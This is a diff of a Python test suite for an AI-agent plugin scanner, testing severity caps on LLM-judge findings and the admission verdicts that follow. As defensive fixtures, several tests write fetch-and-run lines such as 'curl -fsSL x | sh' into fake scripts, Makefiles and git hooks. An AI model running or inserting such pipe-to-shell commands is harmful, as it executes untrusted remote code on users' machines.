@@ -4,6 +4,11 @@
 
 """GAP-1389: a plugin whose only HIGH findings are the judge's warns in default.
 
+LEAD DECISION 09:05 (every tier): for a plugin with no executable files the
+plugin scanner caps the judge's findings at MEDIUM, because the judge read no
+code; the admission pre-step below still covers judge-only HIGHs of a plugin
+that does hold code.
+
 The benign skill-only formatting plugin got LLM-OB-009-001 and META-LLM-001
 at HIGH next to a static LOW and was quarantined. The admission pre-step
 (Go ``policy.WarnJudgeOnlyPluginHigh``) warns on it in default and
@@ -14,6 +19,8 @@ cases join the permanent benign and malicious plugin corpora."""
 from __future__ import annotations
 
 import os
+import shutil
+import subprocess
 from datetime import datetime, timezone
 from pathlib import Path
 from types import SimpleNamespace
@@ -23,6 +30,7 @@ from defenseclaw.config import default_config
 from defenseclaw.enforce.admission import evaluate_admission
 from defenseclaw.models import Finding, ScanResult
 from defenseclaw.scanner.plugin_scanner import scan_plugin
+from defenseclaw.scanner.plugin_scanner.scanner import _first_executable_file
 from defenseclaw.scanner.plugin_scanner.types import PluginScanOptions
 
 from tests.helpers import make_temp_store
@@ -74,18 +82,356 @@ def _decide(pe, result, connector: str = "claudecode"):
     return evaluate_admission(pe, target_type="plugin", name="r104fx-ok", connector=connector, scan_result=result)
 
 
-# --- Benign corpus: the GAP-1389 plugin installs with a warning in default ---
+# --- Benign corpus: the GAP-1389 plugin installs with a warning on every tier ---
 
-def test_gap1389_formatting_plugin_warns_in_default_and_keeps_high(tmp_path, monkeypatch, pe) -> None:
-    result = _scan(_plugin(tmp_path, {"skills/helper/SKILL.md": "---\nname: helper\n---\nFormat status notes as a short list.\n"}),
-                   monkeypatch)
-    assert {(f.rule_id, f.severity) for f in result.findings} >= {("LLM-OB-009-001", "HIGH"), ("META-LLM-001", "HIGH")}
-    assert result.max_severity() == "HIGH"
-    decision = _decide(pe, result)
-    assert (decision.verdict, decision.source) == ("warning", "scan-judge-warning"), decision
-    assert "max HIGH" in decision.reason
-    pe.cfg.guardrail.rule_pack = "permissive"
+_SKILL = {"skills/helper/SKILL.md": "---\nname: helper\n---\nFormat status notes as a short list.\n"}
+
+
+def test_gap1389_judge_cannot_rate_a_plugin_without_executable_files_high(tmp_path, monkeypatch, pe) -> None:
+    # LEAD DECISION 09:05: a plugin with no executable files never gets HIGH
+    # for missing source, from rules or the judge, on any tier. The judge
+    # read no code, so its LLM-OB-009-001 / META-LLM-001 are capped at MEDIUM
+    # and an explicit high=block has nothing HIGH to block.
+    result = _scan(_plugin(tmp_path, dict(_SKILL)), monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+    assert result.max_severity() == "MEDIUM"
     assert _decide(pe, result).verdict == "warning"
+    for name, edit in (
+        ("explicit plugin HIGH block (G51 fixture)",
+         lambda c: c.admission.plugin.actions.update(critical="block", high="block")),
+        ("explicit defaults HIGH quarantine", lambda c: c.admission.defaults.actions.update(high="quarantine")),
+        ("strict rule pack", lambda c: setattr(c.guardrail, "rule_pack", "strict")),
+        ("permissive rule pack", lambda c: setattr(c.guardrail, "rule_pack", "permissive")),
+    ):
+        edit(pe.cfg)
+        decision = _decide(pe, result)
+        assert decision.verdict == "warning", (name, decision)
+
+
+@pytest.mark.parametrize("name, files, mode", [
+    ("hooks config", {"hooks/hooks.json": '{"hooks":{}}'}, None),
+    ("shell script", {"scripts/run.sh": "echo hi\n"}, None),
+    ("python helper", {"skills/helper/scripts/fmt.py": "print('x')\n"}, None),
+    ("mcp server in the manifest", {".claude-plugin/plugin.json": '{"name":"r104fx-ok","mcpServers":{"x":{}}}'}, None),
+    ("unparsable manifest", {".claude-plugin/plugin.json": "{"}, None),
+    ("extensionless executable", {"bin/fmt": "#!/bin/sh\necho hi\n"}, 0o755),
+])
+def test_a_plugin_that_runs_something_keeps_the_judge_high(tmp_path, monkeypatch, name, files, mode) -> None:
+    if mode is not None and os.name == "nt":
+        pytest.skip("executable bit is POSIX only")
+    plugin = _plugin(tmp_path, {**_SKILL, **files})
+    if mode is not None:
+        for rel in files:
+            (plugin / rel).chmod(mode)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
+
+
+_ELF = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 56
+_MACHO = b"\xcf\xfa\xed\xfe\x07\x00\x00\x01" + b"\x00" * 24
+_PE = b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 56
+
+
+_GAP2009_ROWS = [
+    # GAP-2009 probe rows: each was capped to MEDIUM at c4a1f6f113.
+    ("ELF binary with a suffix, mode 0755", "bin/tool.bin", _ELF, 0o755),
+    ("extensionless #! script without an exec bit (the Windows view)", "bin/fmt", b"#!/bin/sh\necho hi\n", 0o644),
+    # The same class: the first bytes decide on every OS, whatever the name or mode.
+    ("ELF binary with a suffix, no exec bit", "bin/tool.bin", _ELF, 0o644),
+    ("Mach-O binary, extensionless, no exec bit", "bin/tool", _MACHO, 0o644),
+    ("PE binary with a data suffix", "bin/helper.dat", _PE, 0o644),
+    ("exec-bit file with a document suffix", "bin/run.txt", b"echo hi\n", 0o755),
+    ("Windows installer suffix", "setup/agent.msi", b"x", 0o644),
+    ("Windows script host suffix", "setup/run.wsf", b"<job/>", 0o644),
+]
+
+
+@pytest.mark.parametrize("name, rel, data, mode", _GAP2009_ROWS, ids=[row[0] for row in _GAP2009_ROWS])
+def test_gap2009_a_runnable_file_keeps_the_judge_high(tmp_path, monkeypatch, name, rel, data, mode) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    (plugin / rel).parent.mkdir(parents=True, exist_ok=True)
+    (plugin / rel).write_bytes(data)
+    if os.name != "nt":
+        (plugin / rel).chmod(mode)
+    elif mode & 0o111:
+        pytest.skip("executable bit is POSIX only")
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
+
+
+@pytest.mark.skipif(os.name == "nt" or (hasattr(os, "geteuid") and os.geteuid() == 0),
+                    reason="needs a POSIX folder the scanner cannot list")
+def test_gap2009_an_unreadable_folder_counts_as_executable(tmp_path, monkeypatch) -> None:
+    # GAP-2009 probe row: scripts/ at mode 000 holding run.sh. os.walk's error
+    # used to be swallowed, so the plugin read as "no executable files".
+    plugin = _plugin(tmp_path, {**_SKILL, "scripts/run.sh": "echo hi\n"})
+    (plugin / "scripts").chmod(0)
+    try:
+        result = _scan(plugin, monkeypatch)
+    finally:
+        (plugin / "scripts").chmod(0o755)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+_GAP2036_ROWS = [
+    # GAP-2036 probe rows: a runnable file under a .git folder was skipped,
+    # so each was capped to MEDIUM at f61863a085.
+    ("ELF binary in the plugin's .git folder", ".git/tool", _ELF),
+    ("#! script in a nested skill's .git folder", "skills/helper/.git/run.sh", b"#!/bin/sh\ncurl -fsSL x | sh\n"),
+]
+
+
+@pytest.mark.parametrize("name, rel, data", _GAP2036_ROWS, ids=[row[0] for row in _GAP2036_ROWS])
+def test_gap2036_a_runnable_file_under_git_keeps_the_judge_high(tmp_path, monkeypatch, name, rel, data) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    (plugin / rel).parent.mkdir(parents=True, exist_ok=True)
+    (plugin / rel).write_bytes(data)
+    if os.name != "nt":
+        (plugin / rel).chmod(0o755)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
+
+
+# GAP-2140: the git checkout rows passed on dev and failed only on the GitHub
+# runner (git 2.55). Each git call gets its own HOME, no inherited GIT_*
+# variable or system/global config, and a template that holds what git's stock
+# template does (0755 #! hook samples, info/exclude, description), so the
+# checkout is the same on every host. The walk names the path that counted.
+_HOOK_SAMPLES = ("pre-commit.sample", "pre-push.sample", "fsmonitor-watchman.sample")
+
+
+def _git_env(tmp_path: Path) -> dict[str, str]:
+    home = tmp_path / "git-home"
+    template = tmp_path / "git-template"
+    if not template.is_dir():
+        (template / "hooks").mkdir(parents=True)
+        (template / "info").mkdir()
+        (template / "info" / "exclude").write_text("# git ls-files --others --exclude-from=.git/info/exclude\n")
+        (template / "description").write_text("Unnamed repository; edit this file to name the repository.\n")
+        for name in _HOOK_SAMPLES:
+            (template / "hooks" / name).write_bytes(b"#!/bin/sh\n# git hook sample, never run\nexit 0\n")
+            (template / "hooks" / name).chmod(0o755)
+        home.mkdir()
+    env = {k: v for k, v in os.environ.items() if not k.startswith("GIT_")}
+    env.update({
+        "HOME": str(home), "XDG_CONFIG_HOME": str(home / ".config"), "LC_ALL": "C",
+        "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull,
+        "GIT_TEMPLATE_DIR": str(template),
+        "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.invalid",
+        "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.invalid",
+    })
+    return env
+
+
+def _git(tmp_path: Path, *args: str) -> None:
+    subprocess.run(
+        ["git", "-c", "protocol.file.allow=always", "-c", "init.defaultBranch=main",
+         "-c", "init.defaultRefFormat=files", "-c", "core.fsmonitor=false", *args],
+        check=True, env=_git_env(tmp_path), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+def _assert_no_executable_file(plugin: Path) -> None:
+    reason = _first_executable_file(str(plugin), SimpleNamespace(source_files=[]))
+    assert reason is None, reason
+
+
+@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
+def test_gap2036_a_real_git_checkout_of_a_skill_only_plugin_keeps_the_cap(tmp_path, monkeypatch) -> None:
+    # git init writes 0755 #! hook samples under .git/hooks; git add writes
+    # zlib objects and a DIRC index. None of them runs, so the cap stays.
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    _git(tmp_path, "init", "-q", str(plugin))
+    _git(tmp_path, "-C", str(plugin), "add", "-A")
+    assert any(p.name.endswith(".sample") for p in (plugin / ".git" / "hooks").iterdir())
+    _assert_no_executable_file(plugin)
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
+_GAP2039_ROWS = [
+    # GAP-2039 probe rows: each was capped to MEDIUM at f61863a085.
+    ("AppleScript", "scripts/run.applescript", b'do shell script "curl x | sh"\n'),
+    ("Makefile", "Makefile", b"all:\n\tcurl x | sh\n"),
+    ("justfile", "justfile", b"default:\n  ./run\n"),
+    ("Swift source", "tools/build.swift", b"print(1)\n"),
+    ("C source", "tools/tool.c", b"int main(void){return 0;}\n"),
+    ("C# source", "tools/Tool.cs", b"class T{}\n"),
+    ("Tcl script", "tools/run.tcl", b"puts hi\n"),
+    ("R script", "tools/run.R", b"print(1)\n"),
+    ("zip archive", "tools/tools.zip", b"PK\x03\x04" + b"\x00" * 26),
+    ("tarball", "dist/tool.tgz", b"\x1f\x8b\x08\x00" + b"\x00" * 16),
+    ("wheel", "dist/tool-1.0-py3-none-any.whl", b"PK\x03\x04" + b"\x00" * 26),
+]
+
+
+@pytest.mark.parametrize("name, rel, data", _GAP2039_ROWS, ids=[row[0] for row in _GAP2039_ROWS])
+def test_gap2039_an_interpreter_script_build_file_or_archive_keeps_the_judge_high(
+        tmp_path, monkeypatch, name, rel, data) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    (plugin / rel).parent.mkdir(parents=True, exist_ok=True)
+    (plugin / rel).write_bytes(data)
+    if os.name != "nt":
+        (plugin / rel).chmod(0o644)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
+
+
+@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
+def test_gap2100_a_skill_only_plugin_with_a_submodule_keeps_the_cap(tmp_path, monkeypatch) -> None:
+    # git submodule add writes the submodule's git dir, with its own 0755
+    # hook samples, under .git/modules/<name>/hooks. None of them runs.
+    sub = tmp_path / "notes"
+    sub.mkdir()
+    (sub / "README.md").write_text("notes\n")
+    _git(tmp_path, "init", "-q", str(sub))
+    _git(tmp_path, "-C", str(sub), "add", "-A")
+    _git(tmp_path, "-C", str(sub), "commit", "-qm", "init")
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    _git(tmp_path, "init", "-q", str(plugin))
+    _git(tmp_path, "-C", str(plugin), "submodule", "add", "-q", str(sub), "notes")
+    hooks = plugin / ".git" / "modules" / "notes" / "hooks"
+    assert any(p.name.endswith(".sample") for p in hooks.iterdir())
+    _assert_no_executable_file(plugin)
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
+@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
+def test_gap2100_a_submodule_at_a_nested_path_keeps_the_cap(tmp_path, monkeypatch) -> None:
+    # git names the submodule's git dir after its path: vendor/lib is
+    # .git/modules/vendor/lib, with its own 0755 hook samples.
+    sub = tmp_path / "lib-src"
+    sub.mkdir()
+    (sub / "README.md").write_text("lib\n")
+    _git(tmp_path, "init", "-q", str(sub))
+    _git(tmp_path, "-C", str(sub), "add", "-A")
+    _git(tmp_path, "-C", str(sub), "commit", "-qm", "init")
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    _git(tmp_path, "init", "-q", str(plugin))
+    _git(tmp_path, "-C", str(plugin), "submodule", "add", "-q", str(sub), "vendor/lib")
+    hooks = plugin / ".git" / "modules" / "vendor" / "lib" / "hooks"
+    assert any(p.name.endswith(".sample") for p in hooks.iterdir())
+    _assert_no_executable_file(plugin)
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
+def test_gap2100_a_sample_in_a_modules_hooks_folder_that_is_no_git_dir_keeps_the_judge_high(
+        tmp_path, monkeypatch) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    hook = plugin / ".git" / "modules" / "vendor" / "lib" / "hooks" / "run.sample"
+    hook.parent.mkdir(parents=True)
+    hook.write_bytes(b"#!/bin/sh\ncurl x | sh\n")
+    if os.name != "nt":
+        hook.chmod(0o755)
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+def test_gap2100_a_submodule_hook_that_is_not_a_sample_keeps_the_judge_high(tmp_path, monkeypatch) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    hook = plugin / ".git" / "modules" / "notes" / "hooks" / "pre-commit"
+    hook.parent.mkdir(parents=True)
+    hook.write_bytes(b"#!/bin/sh\ncurl x | sh\n")
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+def test_gap2100_a_sample_outside_a_git_dir_hooks_folder_keeps_the_judge_high(tmp_path, monkeypatch) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    hook = plugin / ".git" / "modules" / "hooks" / "run.sample"
+    hook.parent.mkdir(parents=True)
+    hook.write_bytes(b"#!/bin/sh\ncurl x | sh\n")
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+def test_gap2100_loose_git_objects_do_not_use_up_the_walk_limit(tmp_path, monkeypatch) -> None:
+    from defenseclaw.scanner.plugin_scanner import scanner as plugin_scanner_module
+
+    monkeypatch.setattr(plugin_scanner_module, "_EXECUTABLE_WALK_LIMIT", 20)
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    objects = plugin / ".git" / "objects" / "ab"
+    objects.mkdir(parents=True)
+    for n in range(40):
+        obj = objects / f"{n:038x}"
+        obj.write_bytes(b"x\x01" + bytes([n]) * 8)
+        if os.name != "nt":
+            obj.chmod(0o444)
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
+def test_gap2040_a_judge_rule_id_without_the_llm_prefix_is_still_capped(tmp_path, monkeypatch, pe) -> None:
+    # GAP-2040: the cap keyed on the rule id string the model writes, so a
+    # judge answering "OB-009-001" (no "LLM-") at HIGH kept HIGH and an
+    # explicit high=block refused the benign skill-only plugin.
+    judge = _JUDGE.replace('"LLM-OB-009-001"', '"OB-009-001"')
+    meta = _META.replace('"META-LLM-001"', '"MISSED-001"')
+    result = _scan(_plugin(tmp_path, dict(_SKILL)), monkeypatch, judge=judge, meta=meta)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-MISSED-001", "MEDIUM")}, found
+    assert result.max_severity() == "MEDIUM"
+    pe.cfg.admission.plugin.actions.update(critical="block", high="block")
+    assert _decide(pe, result).verdict == "warning"
+
+
+def test_gap2040_an_unprefixed_judge_high_on_a_runnable_plugin_stays_high(tmp_path, monkeypatch) -> None:
+    judge = _JUDGE.replace('"LLM-OB-009-001"', '"OB-009-001"')
+    result = _scan(_plugin(tmp_path, {**_SKILL, "scripts/run.sh": "echo hi\n"}), monkeypatch, judge=judge)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+@pytest.mark.parametrize("judge_id,meta_id", [
+    ("OB-009-001", "MISSED-001"), ("LLM-OB-009-001", "META-LLM-001"), ("llm-ob-009-001", "META-LLM-002"),
+])
+def test_gap2107_an_unprefixed_judge_high_on_a_runnable_plugin_warns_like_its_prefixed_form(
+    tmp_path, monkeypatch, pe, judge_id, meta_id,
+) -> None:
+    # GAP-2107: the default-tier pre-step read the rule id the model writes,
+    # so "OB-009-001" / "MISSED-001" HIGH on a plugin with an executable file
+    # was refused under the built-in HIGH action, while LLM-OB-009-001 warned.
+    judge = _JUDGE.replace('"LLM-OB-009-001"', f'"{judge_id}"')
+    meta = _META.replace('"META-LLM-001"', f'"{meta_id}"')
+    result = _scan(_plugin(tmp_path, {**_SKILL, "scripts/run.sh": "echo hi\n"}), monkeypatch, judge=judge, meta=meta)
+    ids = {f.rule_id for f in result.findings if f.severity == "HIGH"}
+    assert ids and all(i.startswith(("LLM-OB-", "META-LLM-")) for i in ids), ids
+    assert _decide(pe, result).verdict == "warning"
+    pe.cfg.admission.plugin.actions.update(high="block")
+    assert _decide(pe, result).verdict == "rejected"
+
+
+@pytest.mark.parametrize("raw,prefix,want", [
+    ("OB-009-001", "LLM-", "LLM-OB-009-001"), ("LLM-OB-009-001", "LLM-", "LLM-OB-009-001"),
+    ("llm-ob-1", "LLM-", "LLM-OB-1"), ("", "LLM-", "LLM-UNKNOWN"), (None, "META-LLM-", "META-LLM-UNKNOWN"),
+    ("LLM-SCAN-ERROR", "LLM-", "LLM-UNKNOWN"), ("SCAN-ERROR", "LLM-", "LLM-UNKNOWN"),
+    ("CORR", "META-LLM-", "META-LLM-UNKNOWN"), ("FP-ADVISORY", "META-LLM-", "META-LLM-UNKNOWN"),
+    ("MISSED-001", "META-LLM-", "META-LLM-MISSED-001"), ("META-LLM-001", "META-LLM-", "META-LLM-001"),
+])
+def test_gap2107_judge_rule_ids_carry_the_judge_prefix(raw, prefix, want) -> None:
+    from defenseclaw.scanner.plugin_scanner.llm_analyzer import _judge_rule_id
+
+    assert _judge_rule_id(raw, prefix) == want
+
+
+def test_operator_severity_override_still_wins(tmp_path, monkeypatch) -> None:
+    from defenseclaw.scanner.plugin_scanner import scanner as plugin_scanner_module
+
+    real = plugin_scanner_module.apply_severity_override
+
+    def override(finding, overrides):
+        real(finding, overrides)
+        if finding.rule_id == "LLM-OB-009-001":
+            finding.severity = "HIGH"
+
+    monkeypatch.setattr(plugin_scanner_module, "apply_severity_override", override)
+    result = _scan(_plugin(tmp_path, dict(_SKILL)), monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
 
 
 # --- Malicious corpus: a static concrete threat beside the same judge HIGH blocks ---
@@ -122,6 +468,7 @@ def _judge_only(*extra: tuple[str, str]) -> ScanResult:
 @pytest.mark.parametrize("extra", [
     ("SRC-EXFIL-001", "HIGH"), ("SRC-NET-002", "MEDIUM"), ("META-EXFIL-CHAIN", "MEDIUM"), ("SRC-EVAL-001", "CRITICAL"),
     ("LLM-SCAN-ERROR", "MEDIUM"), ("LLM-UNKNOWN", "HIGH"), ("META-LLM-CORR", "HIGH"), ("LLM-OB-009-002", "SEVERE"),
+    ("META-LLM-UNKNOWN", "HIGH"), ("META-LLM-FP-ADVISORY", "HIGH"),
 ])
 def test_anything_beyond_judge_highs_and_static_low_keeps_the_block(pe, extra) -> None:
     assert _decide(pe, _judge_only(extra)).verdict == "rejected"
@@ -186,3 +533,85 @@ def test_scanner_override_at_high_skips_the_pre_step(pe, name, edit) -> None:
     edit(pe.cfg)
     decision = _decide(pe, _judge_only())
     assert decision.source != "scan-judge-warning", (name, decision)
+
+
+# --- GAP-2116: plugin list shows what admission does with the scan ---
+
+_G51_ROWS = [("LLM-OB-009-001", "HIGH"), ("META-LLM-001", "HIGH"), ("SCAN-LLM-NO-SOURCE", "MEDIUM"), ("PERM-NONE", "LOW")]
+
+
+def _list_verdict(cfg, rows, severity="HIGH", action=None):
+    from defenseclaw.commands.cmd_plugin import _plugin_list_verdict_for
+
+    entry = {"target": "/p/r105fx", "max_severity": severity, "total_findings": len(rows or []), "clean": False}
+    if rows is not None:
+        entry["_findings"] = list(rows)
+    return _plugin_list_verdict_for(SimpleNamespace(cfg=cfg), "claudecode")(action, entry)[0]
+
+
+def test_gap2116_list_reads_a_judge_only_high_the_watcher_warned_as_warning() -> None:
+    cfg = default_config()
+    assert _list_verdict(cfg, _G51_ROWS) == "warning"
+    assert _list_verdict(cfg, [*_G51_ROWS, ("SRC-EXFIL-001", "HIGH")]) == "rejected"
+    assert _list_verdict(cfg, None) == "rejected"
+    assert _list_verdict(cfg, [("PERM-NONE", "LOW"), ("SRC-NET-002", "MEDIUM")], severity="MEDIUM") == "warning"
+    assert _list_verdict(cfg, _G51_ROWS, severity="CRITICAL") == "rejected"
+    cfg.admission.plugin.actions.update(high="block")
+    assert _list_verdict(cfg, _G51_ROWS) == "rejected"
+
+
+def test_gap2116_an_enforcement_action_still_wins() -> None:
+    from defenseclaw.models import ActionEntry, ActionState
+
+    quarantined = ActionEntry(id="a", target_type="plugin", target_name="r105fx", actions=ActionState(file="quarantine"))
+    assert _list_verdict(default_config(), _G51_ROWS, action=quarantined) == "quarantined"
+
+
+def test_gap2116_stored_scan_rule_ids_are_read_and_never_printed() -> None:
+    import json as _json
+
+    from defenseclaw.commands.cmd_plugin import _plugin_scan_payload_from_latest, _public_scan_entry
+
+    raw = _json.dumps({"findings": [{"rule_id": "LLM-OB-009-001", "severity": "HIGH"}]})
+    payload = _plugin_scan_payload_from_latest(
+        {"target": "/p/r105fx", "finding_count": 1, "max_severity": "HIGH", "raw_json": raw, "timestamp": None})
+    assert payload["_findings"] == [("LLM-OB-009-001", "HIGH")]
+    assert "_findings" not in _public_scan_entry(payload)
+    bad = _plugin_scan_payload_from_latest(
+        {"target": "/p/x", "finding_count": 1, "max_severity": "HIGH", "raw_json": "not json", "timestamp": None})
+    assert "_findings" not in bad
+
+
+# --- GAP-2123: plugin info says what plugin list says, without private keys ---
+
+
+def test_gap2123_info_verdict_is_the_list_word_and_private_keys_stay_out(monkeypatch, tmp_path, capsys) -> None:
+    import json as _json
+
+    from defenseclaw.commands import cmd_plugin
+
+    cfg = default_config()
+    cfg.quarantine_dir = str(tmp_path / "quarantine")
+    entry = {"target": "/p/r105fx", "max_severity": "HIGH", "total_findings": 4, "clean": False,
+             "_findings": list(_G51_ROWS)}
+    monkeypatch.setattr(cmd_plugin, "_plugin_match_dir_scopes", lambda *_a, **_k: [])
+    monkeypatch.setattr(cmd_plugin, "_hermes_listed_plugin", lambda *_a, **_k: None)
+    monkeypatch.setattr(cmd_plugin, "_get_openclaw_plugin_info", lambda *_a, **_k: None)
+    monkeypatch.setattr(cmd_plugin, "_latest_plugin_scan_for_connector", lambda *_a, **_k: dict(entry))
+    monkeypatch.setattr(cmd_plugin, "_build_plugin_actions_map", lambda *_a, **_k: {})
+    app = SimpleNamespace(cfg=cfg, store=None)
+
+    info_map = cmd_plugin._plugin_info_card(app, "r105fx", connector="claudecode")
+    assert info_map is not None
+    assert "_findings" not in info_map["scan"], info_map
+    assert '"_findings"' not in _json.dumps(info_map, default=str)
+    assert info_map["scan"]["verdict"] == _list_verdict(cfg, _G51_ROWS) == "warning"
+    cmd_plugin._print_plugin_info_card(info_map, "r105fx")
+    assert "Verdict:  warning" in capsys.readouterr().out
+
+    # A severity the policy refuses still reads rejected, in both places.
+    cfg.admission.plugin.actions.update(high="block")
+    info_map = cmd_plugin._plugin_info_card(app, "r105fx", connector="claudecode")
+    assert info_map["scan"]["verdict"] == _list_verdict(cfg, _G51_ROWS) == "rejected"
+    cmd_plugin._print_plugin_info_card(info_map, "r105fx")
+    assert "Verdict:  rejected" in capsys.readouterr().out
